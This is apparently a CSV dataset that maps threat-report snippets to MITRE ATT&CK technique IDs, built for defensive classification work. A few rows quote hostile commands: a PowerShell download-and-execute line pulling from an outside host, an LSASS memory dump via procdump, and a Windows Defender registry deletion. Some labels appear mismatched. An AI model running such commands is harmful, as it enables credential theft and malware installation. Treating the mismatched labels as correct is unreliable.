text,label
has been compiled and encrypted with PyInstaller specifically using the --key flag during the build phase.,T1027
Adversaries can instruct  to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.,T1053.005
has the capability of sending additional payloads to the hosts,T1105
has created a scheduled task to execute a .vbe file multiple times a day.,T1053.005
makes extensive use of the Windows API to execute commands and launch processes.,T1106
wmic  /node,T1070.004
uses cmd.exe on the victim's computer.,T1059.003
cmd.exe /c,T1059.003
performs XOR encryption.,T1573.001
creates a Registry Run key to establish persistence.,T1547.001
During  threat actors installed DLLs and backdoors as Windows services.,T1543.003
can determine the hostname and linux version on a compromised host.,T1082
used letmein to scan for saved usernames on the target system.,T1033
has created a fake rm binary to replace the legitimate Linux binary.,T1036.005
has decrypted itself using a single-byte XOR scheme. Additionally  can decrypt its configuration data at runtime.,T1140
utilizes Run Registry keys in the HKLM hive as a persistence mechanism.,T1547.001
can collect the user name from the victim's machine.,T1033
c:\windows\temp\procdump64.exe -accepteula -ma lsass.exe,T1003.001
can use HTTP and HTTPS in C2 communications.(Citation: PWC WellMess July 2020)(Citation: PWC WellMess C2 August 2020)(Citation: CISA WellMess July 2020),T1071.001
strings decoded when running,T1140
has encrypted payloads and strings.(Citation: Medium Metamorfo Apr 2020),T1027
Cobalt Strike Beacon was dropped and executed on the system,T1105
the decryption algorithm,T1140
uses HTTP and HTTPS for C2.,T1071.001
Documents with the Flash exploit managed to evade static defenses and remain undetected as an exploit on VirusTotal,T1068
malware can download additional files from C2 servers.,T1105
used steganography to locate the start of its encoded payload within legitimate 7-Zip code.,T1027
uses PowerShell to pull and run,T1105
Process Hollowing,T1055
Once the command line arguments are generated,T1059.003
can add itself to the Registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run for persistence.,T1547.001
can download additional files.,T1105
the decrypted payload address,T1140
creates a new hidden directory to store all components' outputs in a dedicated sub-folder for each.,T1564.001
Exploitation of this vulnerability allows an attacker to escalate privileges on the affected system,T1068
"Kaspersky Lab products detect the malware used by Poseidon Group with the following detection names: Backdoor.Win32.Nhopro HEUR:Backdoor.Win32.Nhopro.gen HEUR:Hacktool.Win32.Nhopro.gen How many victims have you found? At least 35 victim companies have been identified with primary targets including financial and government institutions, telecommunications, manufacturing, energy and other service utility companies, as well as media and public relations firms",T1070.004
can upload files over the C2 channel from the infected host. ,T1041
Setup a profile to facilitate domain fronting,T1090
has used various API calls.,T1106
can use HTTPS for C2 using the Microsoft Graph API.,T1071.001
can decode and decrypt data received from C2.(Citation: PWC WellMess July 2020)(Citation: PWC WellMess C2 August 2020),T1140
can execute remote commands via the command-line interface.,T1059.003
establishes persistence through a Registry Run key.,T1547.001
The actor leveraged Impacket’s wmiexec.py to execute commands with a semi-interactive shell,T1047
can use two exploits in SMBv1 EternalBlue and EternalRomance to spread itself to other remote systems on the network.(Citation: Talos Nyetya June 2017)(Citation: US-CERT NotPetya 2017),T1210
has monitored critical processes to ensure resiliency. ,T1057
the threat actor must first decrypt them,T1140
A variant of  executes dir C:\progra~1 when initially run.(Citation: Lotus Blossom Jun 2015),T1083
has used stolen domain admin accounts to compromise additional hosts.,T1078
The batch file would download and execute,T1105
has used HTTP for C2 communications.,T1071.001
downloads additional files that are base64-encoded and encrypted with another cipher.,T1027
injects its DLL file into a newly spawned Internet Explorer process.,T1055
obtains the victim’s username.,T1033
has attempted to get users to launch malicious documents to deliver its payload.,T1204.002
"then created a WMI event subscription in order to execute the
backdoor",T1047
Traditional antivirus software and other systems that rely on low-level indicators do not effectively detect and block common and pervasive malware,T1518.001
has the ability to capture screenshots.,T1113
used to proxy,T1090
files had names that resembled legitimate Window file and directory names.(Citation: FireEye SUNBURST Backdoor December 2020),T1036.005
the adversary achieving credentials access by brute force,T1110
"When opened, the user sees a social engineering image telling them that they must click the “Enable editing” button to see the document’s contents.",T1204.002
"using low level APIs: NtCreateSection, NtMapViewOfSection",T1106
has used RDP for direct remote point-and-click access.,T1021.001
"to read
and decrypt those registry key values for proper execution.",T1140
using Active Directory group policies allows the malicious actor to hit all systems in the environment for as long as that group policy is active in the victim’s environment.,T1484.001
malware can use cmd.exe to download and execute payloads and to execute commands on the system.,T1059.003
"The decryption key and IV are
generated using the same unique host properties",T1140
"""cmd""  /c",T1059.003
can parse the available drives and directories to determine which files to encrypt. ,T1083
downloads several additional files and saves them to the victim's machine.,T1105
can use a proxy during exfiltration if set in the configuration.,T1090
During  threat actors used password cracking and pass-the-hash tools to discover usernames and passwords.,T1033
has the ability to decrypt AES encrypted payloads.,T1140
Creation of syscall table for certain NT APIs.,T1106
has the ability to identify the Windows version on the compromised host.,T1082
has a tool called CANDYKING to capture a screenshot of user's desktop.,T1113
"System info, including both hardware and OS info.",T1082
can send files from the victim machine to C2.(Citation: PWC WellMess July 2020),T1005
threat actors used the dir command,T1083
can download files to a compromised host.,T1105
can download additional files onto the host. ,T1105
has been packed for obfuscation.,T1027
Many  samples can perform UAC bypass by using eventvwr.exe to execute a malicious file.,T1548.002
can check for blocklisted process names on a compromised host.,T1057
attempted to disable software security services following checks against a FNV-1a + XOR hashed hardcoded blocklist.,T1562.001
can gain persistence through use of scheduled tasks.,T1053.005
uses a driver registered as a boot start service as the main load-point.,T1543.003
can be used to download or upload a file over a network share.,T1570
has a tool that looks for files and directories on the local file system.(Citation: FireEye Clandestine Fox),T1083
For  the threat actors used the ExpressVPN service to hide their location.,T1090
to download additional malicious files,T1105
can securely delete files by first writing random data to the file.,T1070.004
can create Registry entries to enable services to run.,T1112
This obfuscated process,T1027
has the ability to gain system privileges through Windows services.,T1543.003
has used `CreateToolhelp32Snapshot` `Process32First` and `Process32Next` API calls to enumerate the running processes in the system.,T1057
can send data gathered from the infected machine via HTTP POST request to the C2.,T1041
has gathered information about network IP configurations using .exe and about routing tables using .exe.(Citation: F-Secure BlackEnergy 2014),T1016
the malware tries to remove itself from the machine to avoid being detected and analyzed by security researchers,T1070.004
malware TangoDelta attempts to terminate various processes associated with McAfee. Additionally  malware SHARPKNOT disables the Microsoft Windows System Event Notification and Alerter services.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Loaders)(Citation: Novetta Blockbuster Tools). ,T1562.001
used Base64 to obfuscate commands and the payload.,T1027
Some workstations allowed unprivileged accounts to have local administrator access,T1078
has used several remote administration tools as persistent infiltration channels.,T1219
The account used to perform this lateral movement,T1078
"When executed, mde.ps1 downloaded  from  and removed  from the disk",T1027
tasklist,T1057
has used Registry run keys to establish persistence.,T1547.001
has used  to deploy beacons on compromised systems.,T1569.002
"conducted credential harvesting
via dumping LSASS memory.",T1003.001
The malware is a DLL that is launched using rundll32.exe:,T1218.011
can list running processes.,T1057
Data captured by  is placed in a temporary file under a directory named memdump.,T1074.001
can encrypt C2 traffic using XOR with a hard coded key.,T1573.001
RPC backdoors have included local UPnP RPC proxies.,T1090
executes the whoami on the victims machine.,T1033
a beacon injected into a single Rundll32.exe process,T1055
"From these injected processes,",T1055
with the function “WriteFile”.,T1106
runs tests to determine the privilege level of the compromised user.,T1033
can schedule tasks via the Windows COM API to maintain persistence.,T1053.005
can store harvested data in a custom database under the %TEMP% directory.,T1074.001
has used the NtQueueApcThread syscall to inject code into svchost.exe.,T1055
the ransomware modifies specific registry values,T1112
Verifies that there is no process with the name “rsyncd” on the active process list (“dbus-inotifier” if the Trojan does not have root privileges),T1057
has the ability to download and execute files.,T1105
"information is sent to the C&C, encrypted with a hardcoded key and DES CBC algorithm:",T1573.001
Creating a WMI permanent event subscription,T1047
stored in the Windows registry.,T1112
First-stage legitimate executable for DLL sideloading,T1574.002
has a command to perform a process listing.,T1057
The mounted file contains a hidden folder,T1564.001
including API hashing and execution flow obfuscation through exception mechanism,T1027
contains keylogger functionality.,T1056.001
can send data and files from a compromised host to its C2 server.,T1041
Comnie continues to load an embedded bitmap (BMP) file and decrypt data at offset 0x512,T1140
has the ability to identify the computer name OS version and hardware configuration on a compromised host.,T1082
has used multi-hop proxies to disguise the source of their malicious traffic.,T1090
"their initial exploitation of vulnerable internet-facing applications,",T1190
The SQLRat script is designed to make a direct SQL connection to a Microsoft database controlled by the attackers and execute the contents of various tables,T1105
can use hidden directories and files to hide malicious executables.,T1564.001
has abused local accounts that have the same password across the victims network.,T1078
"Manipulate files and directories (list, download, upload, view, delete",T1070.004
loads it using rundll32,T1218.011
used scheduler and schtasks to create new tasks on remote hosts as part of lateral movement.(Citation: Volexity SolarWinds) They have manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration.(Citation: FireEye SUNBURST Backdoor December 2020)  also created a scheduled task to maintain  persistence when the host booted during the 2020 SolarWinds intrusion.(Citation: CrowdStrike SUNSPOT Implant January 2021) They previously used named and hijacked scheduled tasks to also establish persistence.,T1053.005
creates a command-line shell using cmd.exe.,T1059.003
"executes, it drops a PHP application with additional files",T1105
has used a AMSI bypass which patches the in-memory amsi.dll in PowerShell scripts to bypass Windows antimalware products.,T1562.001
has used the ShellExecuteW() function call. ,T1106
has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives. For example  makes their malware look like legitimate Microsoft Word documents .pdf and/or .lnk files. (Citation: Proofpoint TA505 Sep 2017)(Citation: Proofpoint TA505 June 2018)(Citation: Proofpoint TA505 Jan 2019)(Citation: Cybereason TA505 April 2019)(Citation: ProofPoint SettingContent-ms July 2018)(Citation: Proofpoint TA505 Mar 2018)(Citation: Trend Micro TA505 June 2019)(Citation: Proofpoint TA505 October 2019),T1204.002
malware creates the persistence via Registry Run Keys.,T1547.001
creating the files and registry keys,T1112
The HTA file uses curl utility to download,T1105
has named malicious binaries `serv.exe` `winprint.dll` and `chrome_elf.dll` and has set its persistence in the Registry with the key value Chrome Update to appear legitimate.,T1036.005
has the ability to use scheduled tasks to repeatedly execute malicious payloads on a compromised host.,T1053.005
used different sets of defense evasion and reconnaissance tools such as GMER and Advance Process Termination to manually uninstall antivirus products on the target system.,T1562.001
The C&C server then replies with the encrypted serialized configuration,T1027
has used several code packing methods such as Themida Enigma VMProtect and Obsidium to pack their implants.,T1027
Drive information retrieval,T1083
can deploy additional tools.,T1105
has injected a DLL into svchost.exe.,T1055
has a command to download a file from the C2 server.,T1105
can take screenshots.(Citation: Trend Micro Daserf Nov 2017),T1113
has downloaded additional malware to execute on the victim's machine including by using a PowerShell script to launch shellcode that retrieves an additional payload.(Citation: FireEye FIN7 April 2017),T1105
An instance of cmd.exe was launched through explorer.exe which ran the following command,T1059.003
to lure victims into downloading a malicious file,T1204.002
A version of  introduced in July 2015 inserted junk code into the binary in a likely attempt to obfuscate it and bypass security products.,T1027
has used legitimate process names to hide malware including svchosst.,T1036.005
has obtained information on security software including security logging information that may indicate whether their malware has been detected.,T1518.001
can upload files from a compromised host.,T1005
"To determine the command and control (C2) servers waiting for the data to be sent to, the malware calls a decryption function that uses the RC4 algorithm",T1573.001
"The file appears to have been compiled using a bat2exe tool, which will take batch files (.bat) and convert them to PE (.exe) files",T1083
can record the hostname and kernel version of the target machine.,T1082
 A heavily obfuscated VBS,T1027
Tools such as SystemBC and proprietary backdoors are known to be used,T1219
can delete log files generated from the malware stored at C:\windows\temp\tmp0207.,T1070.004
has been observed deleting the temporary files once they fulfill their task.,T1070.004
downloading of the next stage.,T1105
can track key presses with a keylogger module.,T1056.001
provides access to the system via SSH or any other protocol that uses PAM to authenticate.,T1095
the threat actors were observed using compromised credentials to access the Azure AD Connect device.,T1078
Process to inject into,T1055
contains a command to collect the victim PC name disk drive information and operating system.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020),T1082
downloads another dropper from its C2 server.,T1105
Then the functions are used to load and decrypt the payload.,T1140
Deletes existing file,T1070.004
has a module for  to collect Windows credentials from the victims machine.,T1003.001
contains modules for local privilege escalation exploits such as CVE-2016-9192 and CVE-2016-0099.,T1068
"obfuscated .NET file using process hollowing, which is a code injection technique in which an attacker removes legitimate code from an executable and replaces it with malicious code.",T1055
"Smart, optimized, and connected, XGen security powers Trend Micro’s suite of security solutions: Hybrid Cloud Security, User Protection, and Network Defense",T1518.001
has used the find command to search for specific files.,T1083
has used ICMP custom TCP and UDP in outbound communications.,T1095
uses the Camellia cipher to encrypt communications.,T1573.001
can check for running processes on the victims machine to look for Kaspersky and Bitdefender antivirus products.,T1518.001
has used `ipconfig/all` to gather network configuration information.,T1016
ARP table,T1016
has identified primary users currently logged in users sets of users that commonly use a system or inactive users.,T1033
can collect the user name Windows version computer name and available space on discs from a compromised host.,T1082
attempts to copy itself to remote computers after gaining access via an SMB exploit.,T1570
contains the getProcessList function to run ps aux to get running processes.,T1057
searches through the drive containing the OS then all drive letters C through to Z for documents matching certain extensions.,T1083
"to delete any remaining FOCUSFJORD
forensic evidence, including files on disk, configuration data
encrypted in the registry, and related services and registry keys
used for persistence.",T1070.004
has the ability to decrypt and decode multiple layers of obfuscation.,T1140
The threat actor established RDP sessions to internal servers,T1021.001
has used HTTP for command and control.,T1071.001
This remote process listing,T1057
has used cmd.exe /c and batch files for execution. ,T1059.003
has collected the username from a victim machine.,T1033
operators attempted to use cached credentials from local accounts to gain initial access to additional systems within an internal network.,T1078
establishes persistence by creating a shortcut in the Start Menu folder.,T1547.001
can download additional plugins files and tools.,T1105
The  ScreenCap component can take screenshots on a compromised host.,T1113
It then sets specific registry keys and files as guardrails to skip the setup on subsequent runs.,T1547.001
has a command to delete files from the victims machine.(Citation: Cybereason Oceanlotus May 2017),T1070.004
"Based on dynamic and static analysis of the malware sample associated with the supservermgr[.]com domain however, we were able to determine several unique artifacts which allowed us to expand our dataset and discover additional findings",T1016
"The WMI component of the POSHSPY backdoor leverages a Filter to
execute the PowerShell component of the backdoor on a regular basis.",T1047
A  variant has used rundll32 for execution.,T1218.011
C:\Windows\system32\cmd.exe /C,T1059.003
has a function to download a file to the infected system. ,T1105
the encrypted with AES-128 beacon,T1573.001
threat actor had knowledge of these accounts and used them on the correct systems,T1078
often will search for directories on the network,T1083
downloads files onto infected hosts.,T1105
gathers the Mac address IP address and the network adapter information from the victims machine.,T1016
has obfuscated code with stack strings and string encryption.,T1027
has used XOR-based encryption to mask C2 server locations within the trojan.,T1027
domain fronting,T1090
server component executes code sent via HTTP POST commands.,T1071.001
can obtain information about the victim computer name physical memory country and date.,T1082
can upload files to the victims machine and can download additional payloads.,T1105
can gather the IP address from an infected host. ,T1016
has created scheduled tasks to run malicious scripts on a compromised host.,T1053.005
has checked for the existence of specific files including /usr/sbin/setenforce and /etc/selinux/config. It also has the ability to monitor the cryptocurrency miner file and process.  ,T1083
During  threat actors executed commands through the installed web shell via  exit nodes.,T1090
can execute commands including gathering user information and send the results to C2.,T1041
can inject itself into another process to avoid detection including use of a technique called ListPlanting that customizes the sorting algorithm in a ListView structure.,T1055
"API obfuscation, and execution flow obfuscation",T1027
Download and run,T1105
can download files to the victims machine.(Citation: Fidelis njRAT June 2013),T1105
can collect data from a compromised host.,T1005
has modified Managed Object Format (MOF) files within the Registry to run specific commands and create persistence on the system.,T1112
has the ability to identify installed anti-virus products on a compromised host.,T1518.001
can track key presses with a keylogger module.,T1056.001
has used the Adobe Reader icon for the downloaded file to look more trustworthy.,T1036.005
an ISO file opener that mounts and opens the file with a simple double-click.,T1204.002
the executables and sideloaded files,T1574.002
"In the main thread the SFX/ZIP file is executed/decompressed,",T1140
"Figure 1 Article referenced by decoy document in attack against British government agency   The attached document leverages a DDE exploit to ultimately execute the following code:c:\\windows\\system32\\cmd.exe ""/k PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -noprofile -command (New-Object System.Net.WebClient).DownloadFile('https://881.000webhostapp[.]com/0_31.doc', '%TEMP%\\AAA.exe');Start-Process('%TEMP%\\AAA.exe')Palo Alto Networks first witnessed this DDE exploit technique in May 2017, and attackers continue to leverage it",T1055
payload decoder from Github,T1140
"gathers basic system information, which it then sends to the C2,",T1041
it starts payload execution using the ZwCreateThreadEx API.,T1106
has created Windows tasks to establish persistence.,T1053.005
has exploited MS17-010 to move laterally to other systems on the network.,T1210
The decoded payload,T1140
Below is an example of the service edc603a that was created,T1543.003
obfuscated scripts that were used on victim machines.,T1027
has the ability to exfiltrate stolen victim data through its C2 channel.,T1041
"A block of base64-encoded, encrypted data comprises almost 150KB of that script,",T1027
"After unpacking, the sample loads",T1027
has used malware that searched for files with specific patterns.,T1083
can download files to a compromised host.,T1105
then iterates over each volume to search for specific files related to virtual machines.,T1083
Showing the Transfer of Cobalt Strike Beacons using RDPClip:,T1021.001
can install a new service.,T1543.003
malware has used base64-encoded commands and files and has also encrypted embedded strings with AES.,T1027
SMB beacons are mostly used to make network detection harder and to get access to isolated systems where communication to the internet is prohibited,T1090
collects the current username from the victim.,T1033
"using FindFirstFileW, FindNextFileW, and FindClose APIs",T1106
"and inject    shellcode,",T1055
can modify registry keys including to enable or disable Remote Desktop Protocol (RDP).,T1112
can capture the victims screen remotely.,T1113
has verified C2 domain ownership by decrypting the TXT record using an embedded RSA public key.,T1140
running the malware sets itself up as the service,T1543.003
it stores three embedded binaries within the unpacked payload.,T1027
is capable of using ICMP TCP and UDP for C2.(Citation: Symantec Remsec IOCs),T1095
uses a command-line interface to interact with systems.(Citation: Cobalt Strike TTPs Dec 2017)(Citation: Talos Cobalt Strike September 2020),T1059.003
has used a number of API calls including `VirtualAlloc` `VirtualFree` `LoadLibraryA` `GetProcAddress` and `ExitProcess`. ,T1106
Many of the Fetch samples we analyzed attempted to obfuscate their functionality by encrypting their embedded strings using AES,T1027
has the ability to decrypt AES encrypted payloads.,T1140
During  threat actors ran sc start to start the COMSysApp as part of the service hijacking and sc stop to stop and reconfigure the COMSysApp.,T1569.002
has downloaded additional malware and tools onto a compromised host.(Citation: Palo Alto Gamaredon Feb 2017)(Citation: TrendMicro Gamaredon April 2020)(Citation: ESET Gamaredon June 2020),T1105
HTTP stream containing the content,T1071.001
has added the entire unobfuscated code of the legitimate open source application Blink to its code.,T1027
has the ability to control an infected PC using RDP.,T1021.001
has the ability to compress its components.,T1027
During  the threat actors used the malicious NTWDBLIB.DLL and `cliconfig.exe` to bypass UAC protections.,T1548.002
has injected malicious DLLs into memory with read write and execute permissions.(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),T1055
 MSI installer has masqueraded as a legitimate Adobe Acrobat Reader installer.,T1036.005
 Ammy ,T1219
the execution of the batch file,T1059.003
can take a screenshot of the current desktop.,T1113
uninstaller has base64-encoded its variables. ,T1027
"cyber actors used valid accounts to log into a service specifically designed to accept remote connections,",T1078
has used WMIC to execute remote commands.(Citation: Cycraft Chimera April 2020),T1047
"cmd /C ""C: & cd \ & systeminfo""",T1082
We’ve identified two such files: settings.db sdfg3d.db Here’s how such a database file appears:  These are BASE64 encoded and use the same RC4 encryption key as the malware configuration,T1027
The threat actors downloaded the lsass.exe beacon from their attacker hosted infrastructure,T1105
"It utilizes symmetric key cryptography, where the same secret key is used for both encryption and decryption",T1573.001
uses TCP and UDP for C2.,T1095
The  dropper uses a function to obfuscate the name of functions and other parts of the malware.,T1027
has been seen deleting its own files and payloads to make analysis of the attack more difficult.,T1070.004
cmd.exe /C,T1059.003
has been spread through malicious document lures.,T1204.002
This directory will also contain the process id of the running malware in process.id and a “build name” (as it is called by the author) in build.id,T1057
communicates with its C2 server over HTTP.,T1071.001
has injected itself into remote processes to encrypt files using a combination of VirtualAlloc WriteProcessMemory and CreateRemoteThread.,T1055
can establish persistence by creating a service.,T1543.003
"The threat actors also moved laterally to the domain controller, compromised credentials,",T1078
ipconfig /all,T1016
is a batch script that creates a new user,T1059.003
This module is embedded in the library’s resource section and encrypted with an algorithm similar to RC4,T1027
cmd /C,T1059.003
discover commands using the Windows utilities systeminfo,T1082
packing being used to obfuscate the malware.,T1027
decodes the configuration data and modules.,T1140
This code checks if the disk size is greater than a specified threshold (50 GB as example).,T1082
can modify Registry values within HKEY_CURRENT_USER\Software\Microsoft\Office\<Excel Version>\Excel\Security\AccessVBOM\ to enable the execution of additional code.,T1112
has looked in the registry to find the default browser path.,T1012
 nbtstat ,T1016
can install a Registry Run key for persistence.,T1547.001
has used a plug-in to gather credentials stored in files on the host by various software programs including The Bat! email client Outlook and Windows Credential Store.(Citation: F-Secure BlackEnergy 2014),T1552.001
The computer name and the username is also sent to the C2.,T1041
Decrypted backdoor configuration Reverse analysis of TClient allowed us to determine how to decrypt the C&C information,T1140
service was configured to execute the next step of the installation process by running a legitimate application,T1569.002
and decrypts config,T1140
has established tmate sessions for C2 communications.(Citation: Unit 42 Hildegard Malware),T1219
has the ability to use HTTP for C2 communications.,T1071.001
obtains a list of running processes using the function kill_unwanted.,T1057
can gather victim drive information.,T1083
can use HTTP to communicate with C2 servers.,T1071.001
The services running on the compromised system are checked against the following list,T1057
malware gathers data from the local victim system.,T1005
downloads the following hidden files to evade detection and maintain persistence: /private/tmp/.info.enc /private/tmp/.info.py /private/tmp/.server.sh ~/Library/LaunchAgents/.espl.plist ~/Library/Containers/.[random string]/[random string].,T1564.001
can collect IP information from the victims machine.,T1016
can use a scheduled task for installation.,T1053.005
has created new services or modified existing ones to run executables commands or scripts.,T1569.002
exploited Apache Struts Oracle WebLogic (CVE-2017-10271) and Adobe ColdFusion (CVE-2017-3066) vulnerabilities to deliver malware.(Citation: Talos Rocke August 2018),T1190
s dropper can list all running processes.(Citation: Securelist Dtrack),T1057
uses GET and POST requests over HTTP or HTTPS for command and control to obtain commands and send ZLIB compressed data back to the C2 server.,T1071.001
ran a command to compile an archive of file types of interest from the victim user's directories.,T1005
send the decryption program,T1140
can inject a malicious DLL into a process.(Citation: FireEye Poison Ivy),T1055
can search for specific files on an infected host.,T1083
has disguised an MSI file as the Adobe Acrobat Reader Installer and has masqueraded payloads as OneDrive WhatsApp or Spotify for example.(Citation: Medium Metamorfo Apr 2020) ,T1036.005
has used the Windows API ObtainUserAgentString to obtain the User-Agent from a compromised host to connect to a C2 server.(Citation: McAfee Lazarus Jul 2020)  has also used various often lesser known functions to perform various types of Discovery and .(Citation: Lazarus APT January 2022),T1106
cmd /C,T1059.003
can use compiler-based obfuscation for its code encrypt DLLs and hide Windows API calls.(Citation: CarbonBlack Conti July 2020)(Citation: Cybereason Conti Jan 2021),T1027
Windows task XML file,T1053.005
A  tool can spawn svchost.exe and inject the payload into that process.(Citation: Nccgroup Emissary Panda May 2018),T1055
has exfiltrated host environment information to an external C2 domain via port 9006.,T1041
collects the system name OS version including service pack and system install date and sends the information to the C2 server.,T1082
there is indeed some sort of unpacking happening.,T1027
perform WMI queries,T1047
the second decryption stage occurs,T1140
can collect information from a compromised host.,T1005
can download and execute additional files.,T1105
Like the earlier SSH brute-forcing campaign,T1110
the command-line syntax used,T1059.003
During  the threat actors deployed malware that used API calls including `CreateProcessAsUser`.,T1106
"It then reads and decrypts the content between these values to yield an IP address as shown below:       ---- BEGIN SSH2 PUBLIC KEY ----Comment: ""rsa-key""AAAAB3NzaC1yc2EAAAABJQAAAQEAhLxZe4Qli9xt/WknQK9CDLWubpgknZ0HIHSd8uV/TJvLsRkjpV+U/tMiMxjDwLAHVtNcww2h8bXTtw387M2Iv/mJjQ9Lv3BdNiM3/KvmlpeJZrrFu2n5UC9=DZKSDAAADOECEDFDOCCDEDIDOCIDEDOCHDDZJS=oT+Ps8wD4f0NBUtDdEdXhWp3nxv/mJjQ9Lv3BCFDBd09UZzLrfBO1S0nxrHsxlJ+bPaJE2Q/oxLXTrpeJ6AHyLyeUaBha3q9niJ=---- END SSH2 PUBLIC KEY ----     A Python script to decode strings encrypted with this technique is given in Appendix B – Python Scripts",T1140
encrypts its configuration files with AES-256 and also encrypts its strings.,T1027
stores a configuration files in the startup directory to automatically execute commands in order to persist across reboots.,T1547.001
performed through the CryptUnprotectData API function,T1106
used Mimikatz and customized versions of Windows Credential Dumper to harvest credentials.(Citation: Cybereason Oceanlotus May 2017),T1003.001
has encoded payloads with a single-byte XOR both skipping the key itself and zeroing in an attempt to avoid exposing the key.,T1027
searches for files created within a certain timeframe and whose file extension matches a predefined list.,T1083
uses HTTP for command and control.,T1071.001
has been distributed through spearphishing emails with malicious attachments.,T1566.001
"In this case, after the payload is delivered via an exploit the threat actor places files (named upload.bat, upload.rar, and period.txt, download.txt or silent.txt) in a directory on a Dropbox account",T1105
decrypts resources that are loaded into memory and executed.,T1140
can encrypt C2 communications with a randomly generated key.,T1573.001
is capable of creating a reverse shell.,T1059.003
encrypts strings with XOR and obfuscates the macro code from the initial payload.  also encrypts all configuration and settings in AES and RC4.(Citation: Talos Zeus Panda Nov 2017),T1027
has been distributed via spearphishing as an email attachment.,T1566.001
exfiltrates screenshot files to its C2 server.,T1041
has sent system information to its C2 server using HTTP.,T1041
"The shellcode decodes and decompresses another DLL, which is an updated variant of UPPERCUT",T1140
has used the systeminfo command on a compromised host.,T1082
has embedded a XOR encrypted communications module inside the orchestrator module.(Citation: ESET ComRAT May 2020) ,T1027
See the following for more information and examples of false flags being used in cyberattacks: Wave your false flags! …or the Nightmares and Nuances of a Self-Aware Attribution Space OlympicDestroyer is here to trick the industry Malware description The malware was first seen packed with VMProtect; when unpacked the sample didn’t show any similarities with previously known malware,T1027
execute commands via scheduled tasks/jobs.,T1053.005
has used LNK files to download remote files to the victim's network.(Citation: ATT Sidewinder January 2021),T1105
uses file and folder names related to legitimate programs in order to blend in such as HP Intel Adobe and perflogs.,T1036.005
targets for phishing emails containing this type of decoy document.,T1566.001
wmic  /node,T1070.004
can communicate over HTTP for C2.(Citation: FireEye APT28),T1071.001
"The most notable change to this variant of Zebrocy, other than the programming language used, is the way the tool gathers the system information and running processes",T1057
"If Adobe Flash or Microsoft Silverlight is no longer required, DHS recommends that those applications be removed from systems.The IOCs provided with this alert include IP addresses determined to be part of the HIDDEN COBRA botnet infrastructure, identified as DeltaCharlie",T1016
the malicious executable to unpack itself.,T1027
has been seen exfiltrating system information stored within cookies sent within an HTTP GET request back to its C2 servers. ,T1041
has encrypted and encoded data in its malware including by using base64.(Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018)(Citation: Unit 42 Playbook Dec 2017)(Citation: Crowdstrike Helix Kitten Nov 2018),T1027
has the ability to set SELinux to permissive mode.,T1562.001
deleted the specific history items related to threat actor activity,T1070.004
creating a schedule task,T1053.005
"Identify processes related to backups, antivirus/anti-spyware,",T1518.001
can copy files to other machines on a compromised network.,T1570
downloads additional plug-ins to load on the victims machine including the ability to upgrade and replace its own binary.,T1105
has stored obfuscated JavaScript code in an image file named temp.jpg.,T1027
has executed PowerShell commands which were encoded or compressed using Base64 zlib and XOR.,T1027
Some  variants use raw TCP for C2.,T1095
has decrypted an AES encrypted binary file to trigger the download of other files. ,T1140
has checked the system settings to see if Arabic is the configured language.,T1082
Malicious commands are executed via WMI as a means of “living off the land” and avoiding detection.,T1047
Batch files create a new admin user ,T1059.003
has used a file injector DLL to spawn a benign process on the victim's system and inject the malicious payload into it via process hollowing.,T1055
"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware 
DeleteValue ",T1112
has downloaded and dropped temporary files containing scripts; it additionally has a function to upload files from the victims machine.,T1105
initiating a proxied,T1090
can collect IP addresses from a compromised host.,T1016
Create its own registry key in \SOFTWARE\<uniquename>,T1112
has used a modified version of pentesting script wmiexec.vbs which logs into a remote machine using WMI.(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: Github AD-Pentest-Script),T1047
has the ability to upload and download files.,T1105
has used keyloggers that are also capable of dumping credentials.,T1003.001
"If a target opens the malicious attachment,",T1204.002
can open an active screen of the victims machine and take control of the mouse and keyboard.,T1021.001
creates valid local users to provide access to the system.,T1078
can copy itself into the current users Startup folder as Narrator.exe for persistence.,T1547.001
